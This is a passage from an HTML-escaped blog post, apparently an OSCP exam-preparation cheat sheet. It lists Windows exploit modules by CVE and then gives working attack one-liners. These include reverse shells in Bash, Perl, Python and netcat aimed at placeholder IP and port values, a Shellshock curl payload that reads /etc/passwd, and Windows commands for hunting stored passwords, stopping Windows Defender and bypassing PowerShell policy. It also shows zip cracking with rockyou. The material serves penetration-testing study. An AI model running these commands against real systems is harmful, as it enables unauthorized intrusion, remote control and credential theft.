corruption\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2013-3918\u003C\u002Ftd\u003E\n\u003Ctd\u003Ems13_090_cardspacesigninhelper - exploits CardSpaceClaimCollection class from the icardie.dll ActiveX control - code execution\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2013-7331\u003C\u002Ftd\u003E\n\u003Ctd\u003Ems14_052_xmldom - uses Microsoft XMLDOM object to enumerate a remote machine&#39;s filenames\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2014-6324\u003C\u002Ftd\u003E\n\u003Ctd\u003Ems14_068_kerberos_checksum - exploits the Microsoft Kerberos implementation - privilege escalation\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2014-6332\u003C\u002Ftd\u003E\n\u003Ctd\u003Ems14_064_ole_code_execution -  exploits the Windows OLE Automation array vulnerability\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2014-6352\u003C\u002Ftd\u003E\n\u003Ctd\u003Ems14_064_packager_python - exploits Windows Object Linking and Embedding (OLE) - arbitrary code execution\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2015-0002\u003C\u002Ftd\u003E\n\u003Ctd\u003Entapphelpcachecontrol - NtApphelpCacheControl Improper Authorization Check - privilege escalation\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Ftbody\u003E\u003C\u002Ftable\u003E\n\u003Ch5 id=\"windows-10\"\u003EWindows 10\u003C\u002Fh5\u003E\n\u003Ctable\u003E\n\u003Cthead\u003E\n\u003Ctr\u003E\n\u003Cth align=\"center\"\u003ECVE\u003C\u002Fth\u003E\n\u003Cth\u003EDescription\u003C\u002Fth\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Fthead\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2015-0057\u003C\u002Ftd\u003E\n\u003Ctd\u003Eexploits GUI component of Windows namely the scrollbar element - allows complete control of a Windows machine\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2015-1769\u003C\u002Ftd\u003E\n\u003Ctd\u003EMS15-085 - Vulnerability in Mount Manager - Could Allow Elevation of Privilege\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2015-2426\u003C\u002Ftd\u003E\n\u003Ctd\u003Ems15_078_atmfd_bof MS15-078 - exploits a pool based buffer overflow in the atmfd.dll driver\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2015-2479\u003C\u002Ftd\u003E\n\u003Ctd\u003EMS15-092 - Vulnerabilities in .NET Framework - Allows Elevation of Privilege\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2015-2513\u003C\u002Ftd\u003E\n\u003Ctd\u003EMS15-098 - Vulnerabilities in Windows Journal - Could Allow Remote Code Execution\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2015-2423\u003C\u002Ftd\u003E\n\u003Ctd\u003EMS15-088 - Unsafe Command Line Parameter Passing - Could Allow Information Disclosure\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2015-2431\u003C\u002Ftd\u003E\n\u003Ctd\u003EMS15-080 - Vulnerabilities in Microsoft Graphics Component - Could Allow Remote Code Execution\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2015-2441\u003C\u002Ftd\u003E\n\u003Ctd\u003EMS15-091 - Vulnerabilities exist when Microsoft Edge improperly accesses objects in memory - allows remote code execution\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Ftbody\u003E\u003C\u002Ftable\u003E\n\u003Ch5 id=\"windows-server-2003\"\u003EWindows Server 2003\u003C\u002Fh5\u003E\n\u003Ctable\u003E\n\u003Cthead\u003E\n\u003Ctr\u003E\n\u003Cth align=\"center\"\u003ECVE\u003C\u002Fth\u003E\n\u003Cth\u003EDescription\u003C\u002Fth\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Fthead\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2008-4250\u003C\u002Ftd\u003E\n\u003Ctd\u003Ems08_067_netapi  - exploits a parsing flaw in the path canonicalization code of NetAPI32.dll - bypassing NX\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2017-8487\u003C\u002Ftd\u003E\n\u003Ctd\u003Eallows an attacker to execute code when a victim opens a specially crafted file - remote code execution\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Ftbody\u003E\u003C\u002Ftable\u003E\n\u003Chr\u003E\n\u003Ch2 id=\"proofs\"\u003EPROOFS\u003C\u002Fh2\u003E\n\u003Ch3 id=\"linux-5\"\u003ELinux\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Eecho \" \";echo \"uname -a:\";uname -a;echo \" \";echo \"hostname:\";hostname;echo \" \";echo \"id\";id;echo \" \";echo \"ifconfig:\";\u002Fsbin\u002Fifconfig -a;echo \" \";echo \"proof:\";cat \u002Froot\u002Fproof.txt 2\u003E\u002Fdev\u002Fnull; cat \u002FDesktop\u002Fproof.txt 2\u003E\u002Fdev\u002Fnull;echo \" \"\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"windows-5\"\u003EWindows\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Eecho. &amp; echo. &amp; echo whoami: &amp; whoami 2\u003E nul &amp; echo %username% 2\u003E nul &amp; echo. &amp; echo Hostname: &amp; hostname &amp; echo. &amp; ipconfig \u002Fall &amp; echo. &amp; echo proof.txt: &amp;  type \"C:\\Documents and Settings\\Administrator\\Desktop\\proof.txt\"\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"reverse-shell\"\u003EREVERSE SHELL\u003C\u002Fh2\u003E\n\u003Ch3 id=\"amazing-tool-for-shell-generation\"\u003EAmazing tool for shell generation\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# Download\ngit clone https:\u002F\u002Fgithub.com\u002FShutdownRepo\u002Fshellerator\n\n# Install requirements\npip3 install --user -r requirements.txt\n\n# Executable from anywhere\nsudo cp shellrator.py \u002Fbin\u002Fshellrator\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"bash-1\"\u003EBash\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ebash -i \u003E&amp; \u002Fdev\u002Ftcp\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E 0\u003E&amp;1\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"perl-1\"\u003EPerl\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Eperl -e 'use Socket;$i=\"\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\";$p=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"\u003E&amp;S\");open(STDOUT,\"\u003E&amp;S\");open(STDERR,\"\u003E&amp;S\");exec(\"\u002Fbin\u002Fsh -i\");};'\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"python-1\"\u003EPython\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Epython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\",\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"\u002Fbin\u002Fsh\",\"-i\"]);'\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"netcat-1\"\u003ENetcat\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Erm \u002Ftmp\u002Ff;mkfifo \u002Ftmp\u002Ff;cat \u002Ftmp\u002Ff|\u002Fbin\u002Fsh -i 2\u003E&amp;1|nc \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003E\u002Ftmp\u002Ff\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"more-reverse-shell\"\u003EMore reverse shell\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehttp:\u002F\u002Fpentestmonkey.net\u002Fcheat-sheet\u002Fshells\u002Freverse-shell-cheat-sheet\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"interactive-shell\"\u003EInteractive shell\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# Python\npython -c 'import pty; pty.spawn(\"\u002Fbin\u002Fbash\")'\npython3 -c 'import pty; pty.spawn(\"\u002Fbin\u002Fbash\")'\n\n# Bash\necho os.system('\u002Fbin\u002Fbash')\n\n# Sh\n\u002Fbin\u002Fbash -i\n\n# Perl\nperl -e 'exec \"\u002Fbin\u002Fbash\"'\n\n# Ruby\nexec \"\u002Fbin\u002Fbash\"\n\n# Lua\nos.execute('\u002Fbin\u002Fbash')\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"adjust-interactive-shell\"\u003EAdjust Interactive shell\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Estty size # Find your terminal size -\u003E 50 235\nCtrl-Z\nstty raw -echo  \u002F\u002F Disable shell echo\nfg\nexport SHELL=bash\nexport TERM=xterm OR export TERM=xterm-256color\nstty rows 50 columns 235\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"shellshock\"\u003ESHELLSHOCK\u003C\u002Fh2\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ecurl -H \"user-agent: () { :; }; echo; echo; \u002Fbin\u002Fbash -c 'cat \u002Fetc\u002Fpasswd'\" \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002Fcgi-bin\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ESCRIPT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"useful-linux-commands\"\u003EUSEFUL LINUX COMMANDS\u003C\u002Fh2\u003E\n\u003Ch3 id=\"find-a-file\"\u003EFind a file\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Elocate \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EFILE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nfind \u002F -name \"\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EFILE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\"\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"active-connection\"\u003EActive connection\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Enetstat -lntp\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"list-all-suid-files\"\u003EList all SUID files\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Efind \u002F -perm -4000 2\u003E\u002Fdev\u002Fnull\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"determine-the-current-version-of-linux\"\u003EDetermine the current version of Linux\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E cat \u002Fetc\u002Fissue\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"determine-more-information-about-the-environment\"\u003EDetermine more information about the environment\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Euname -a\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"list-processes-running\"\u003EList processes running\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Eps -faux\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"list-the-allowed-and-forbidden-commands-for-the-invoking-use\"\u003EList the allowed (and forbidden) commands for the invoking use\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Esudo -l\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"useful-windows-commands\"\u003EUSEFUL WINDOWS COMMANDS\u003C\u002Fh2\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Enet config Workstation\nsysteminfo\nnet users\n\nipconfig \u002Fall\nnetstat -ano\n\nschtasks \u002Fquery \u002Ffo LIST \u002Fv\ntasklist \u002FSVC\nnet start\nDRIVERQUERY\n\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated\n\ndir \u002Fs pass == cred == vnc == .config\nfindstr \u002Fsi password *.xml *.ini *.txt\nreg query HKLM \u002Ff password \u002Ft REG_SZ \u002Fs\nreg query HKCU \u002Ff password \u002Ft REG_SZ \u002Fs\n\n# Disable windows defender\nsc stop WinDefend\n\n# Bypass restriction\npowershell -nop -ep bypass\n\n# List hidden files\ndir \u002Fa\n\n# Find a file\ndir \u002Fb\u002Fs \"\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EFILE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\"\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"zip\"\u003EZIP\u003C\u002Fh2\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Efcrackzip -u -D -p '\u002Fusr\u002Fshare\u002Fwordlists\u002Frockyou.txt' file.zip\n\nzip2john file.zip \u003E zip.john\njohn --wordlist=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORDS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E zip.john\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E",date:"2021-12-02",excerpt:"\r\nThis is an cheatsheet for OSCP preparations.\r\n\r\n ",printDate:"December 2, 2021",printReadingTime:"31 min read"}}]};if('serviceWorker' in navigator)navigator.serviceWorker.register('/logbook/service-worker.js');(function(){try{eval("async function x(){}");var main="/logbook/client/client.84164a31.js"}catch(e){main="/logbook/client/legacy/client.a2735aa5.js"};var s=document.createElement("script");try{new Function("if(0)import('')")();s.src=main;s.type="module";s.crossOrigin="use-credentials";}catch(e){s.src="/logbook/client/shimport@1.0.1.js";s.setAttribute("data-main",main);}document.head.appendChild(s);}());</script> 